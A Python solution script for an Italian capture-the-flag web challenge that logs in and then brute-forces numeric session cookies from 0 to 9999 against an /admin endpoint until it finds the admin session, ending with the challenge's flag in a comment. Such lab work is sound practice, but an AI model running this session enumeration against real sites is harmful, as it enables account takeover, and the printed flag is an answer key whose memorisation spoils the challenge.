#! /usr/bin/env python3

# {"descrizione":"Accetta richieste POST contenenti un JSON con i seguenti campi: 'username', 'password'. Permette di creare un nuovo account utente.","percorso":"/register"},
# {"descrizione":"Accetta richieste POST contenenti un JSON con i seguenti campi: 'username', 'password'. In caso di successo, ritorna il cookie di sessione assegnato.","percorso":"/login"},
# {"descrizione":"Accetta richieste GET contenenti un cookie di sessione valido. Distrugge la sessione.","percorso":"/logout"},
# {"descrizione":"Accetta richieste GET contenenti un cookie di sessione valido","percorso":"/admin"}]}

import requests

url = 'http://too-small-reminder.challs.olicyber.it'

register = '/register'
login = '/login'
logout = '/logout'
# registrazione
# res = requests.post(url + register, json={'username':'ciaoc',"password": "ciaociao"}).text

res = requests.get(url+logout, cookies={'session_id':'2473'})
print(res)
res = requests.post(url + login, json={'username':'ciaoc',"password": "ciaociao"})
print(res.text)
print(res.cookies.get_dict())


for i in range(10000):
	res = requests.get(url +'/admin', cookies={'session_id': str(i)}).text
	
	if res.find('riservata') == -1:
		print('la sessione di admin e',i)
		print(res)
		exit(0)

	print(i,'non e la session admin')

# in questo modo si risolve e scopro la flag
# flag{d0n7_cr3473_y0ur_535510n5}